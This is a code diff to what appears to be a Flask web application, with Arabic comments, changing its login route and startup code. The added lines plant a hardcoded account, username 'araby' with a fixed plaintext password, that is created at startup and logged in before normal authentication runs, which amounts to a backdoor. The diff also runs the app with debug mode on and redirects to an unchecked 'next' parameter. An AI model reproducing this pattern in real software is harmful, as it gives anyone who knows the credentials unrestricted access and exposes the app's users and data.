@@ -129,6 +129,21 @@ def login():
     if form.validate_on_submit():
         # تصفية اسم المستخدم من المسافات
         username = form.username.data.strip().lower()
+        password = form.password.data
+        
+        # التحقق من المستخدم الثابت أولاً
+        if username == "araby" and password == "92321066":
+            # إنشاء المستخدم الثابت إذا لم يكن موجوداً
+            from models import create_static_user
+            create_static_user()
+            
+            # البحث عن المستخدم الثابت
+            static_user = User.query.filter_by(username="araby", is_system=True).first()
+            if static_user:
+                login_user(static_user, remember=form.remember_me.data)
+                app.logger.info(f'Static user {username} logged in successfully from IP {request.remote_addr}')
+                next_page = request.args.get('next')
+                return redirect(next_page) if next_page else redirect(url_for('dashboard'))
         
         user = User.query.filter_by(username=username).first()
         
@@ -2141,4 +2156,7 @@ def api_test_database_export():
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
+        # إنشاء المستخدم الثابت عند بدء التطبيق
+        from models import create_static_user
+        create_static_user()
     app.run(debug=True) 
